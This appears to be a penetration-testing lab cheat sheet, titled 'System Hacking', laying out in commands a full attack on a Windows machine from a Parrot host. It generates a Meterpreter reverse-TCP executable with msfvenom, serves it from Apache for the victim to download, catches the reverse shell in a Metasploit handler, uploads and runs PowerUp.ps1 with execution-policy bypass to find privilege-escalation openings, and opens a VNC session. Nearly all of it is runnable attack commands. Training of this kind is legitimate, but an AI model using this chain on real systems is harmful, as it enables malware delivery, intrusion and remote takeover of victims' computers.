# System Hacking

<details>
<summary> Exploit client-side vulnerabilities and establish a VNC(Virtual Network Computing) session</summary>

```cosole

[parrot]
sudo su
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST PIP LPORT 444 -f exe -o /home/attacker/Desktop/Test.exe
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /home/attacker/Desktop/Test.exe /var/www/html/share
service apache2 start

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST PIP
set LPORT 444
exploit 

[windows]
http://PIP/share
download Test.exe

[parrot]
{Note: If the Meterpreter shell is not automatically connected to the session, type sessions -i 1}
sysinfo
upload /root/PowerSploit/Privesc/PowerUp.ps1 -->uploads the PowerSploit file to the target system’s present working directory.

Note: PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service
abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.

shell
powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”

Note: Attackers exploit misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges. After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services that exist in the target OS.

exploit VNC vulnerability to gain remote access
run vnc

```
</details>